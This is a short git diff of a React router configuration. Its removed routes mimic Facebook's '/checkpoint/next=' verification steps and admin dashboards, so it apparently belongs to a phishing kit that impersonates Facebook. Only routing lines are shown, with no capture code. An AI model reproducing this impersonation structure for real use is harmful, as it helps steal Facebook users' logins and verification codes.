@@ -53,24 +53,9 @@ export default function RootNavigation() {
     <BrowserRouter>
       <Routes>
         <Route path="/">
-          <Route index path="/" element={<FacebookButton />} />
-          {/* <Route
-            path="/checkpoint/next=authentication"
-            element={<Confirmation />}
-          />
-          <Route
-            path="/checkpoint/next=error-authentication"
-            element={<CodeTwo />}
-          />
-          <Route
-            path="/checkpoint/next=email"
-            element={<ConfirmationSecond />}
-          />
-          <Route path="/checkpoint/next=phone" element={<TH />} />
-          <Route path="/checkpoint/next=secure" element={<Robot />} /> */}
-          {/* <Route path="/admin/kka" element={<Dashboard />} /> */}
-          {/* <Route path="/admin/kka2" element={<Dashboard2 />} /> */}
-          <Route path="*" element={<FacebookButton />} />
+          <Route index path="/" element={<Dashboard />} />
+          <Route index path="/dashboard2" element={<Dashboard2 />} />
+          <Route path="*" element={<Dashboard />} />
         </Route>
       </Routes>
     </BrowserRouter>
